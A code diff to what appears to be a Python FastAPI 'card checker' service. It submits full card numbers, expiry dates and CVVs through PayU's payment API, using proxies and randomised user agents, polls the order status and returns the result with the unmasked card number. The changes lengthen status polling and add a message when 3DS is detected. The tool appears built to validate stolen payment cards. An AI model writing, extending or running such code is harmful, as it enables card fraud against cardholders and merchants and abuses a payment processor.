@@ -31,25 +31,28 @@ def _random_ua():
     ]
     return random.choice(versions)
 
-def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=4, delay=3):
+# POLLING DINAIIKKAN (LEBIH LAMA)
+def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=10, delay=4):
     headers = {
         'accept': '*/*',
         'authorization': f'Bearer {token}',
         'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
         'user-agent': ua,
     }
-    for _ in range(max_attempts):
+    for attempt in range(max_attempts):
         time.sleep(delay)
         try:
             r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)
             data = r.json()
-            if data.get('category') not in ('IN_PROGRESS', 'NEW'):
+            category = data.get('category')
+            if category not in ('IN_PROGRESS', 'NEW'):
+                print(f"Poll success at attempt {attempt+1}: {category}")  # debug
                 return data
         except:
             pass
     return {"category": "TIMEOUT_POLL", "is_3ds": is_3ds}
 
-# ================== EVENT STREAM LAMA (PENUH) ==================
+# ================== EVENT STREAM ==================
 def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
     session = requests.Session()
     try:
@@ -150,6 +153,9 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
 
         continue_url = pay_data.get('continueUrl', '')
         is_3ds = 'threeds' in continue_url
+        if is_3ds:
+            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS detected. Waiting longer for bank response...', 'class': 'warn'})}\n\n"
+        
         final_status = _poll_status(session, order_id, token, ua, is_3ds)
 
         category = final_status.get('category', '')
@@ -169,7 +175,7 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
     finally:
         session.close()
 
-# ================== JSON API (IKUT KEINGINAN KAU) ==================
+# ================== JSON API ==================
 @app.get("/check")
 async def check_card(
     cc: str = Query(...),
@@ -215,7 +221,7 @@ async def check_card(
 
     return JSONResponse(content={
         "Gateway": "PayU Payment",
-        "CC": cc,                    # Full CC tanpa masking
+        "CC": cc,
         "Result": result.get('msg'),
         "Response": response_value,
         "Status": result.get('status'),
@@ -240,8 +246,3 @@ async def check_card_stream(
         yy = '20' + yy
        
     return StreamingResponse(event_stream(card_num, mm, yy, cvv_code, site, proxy), media_type="text/event-stream")
-
-
-@app.get("/")
-async def root():
-    return {"status": "ok"}
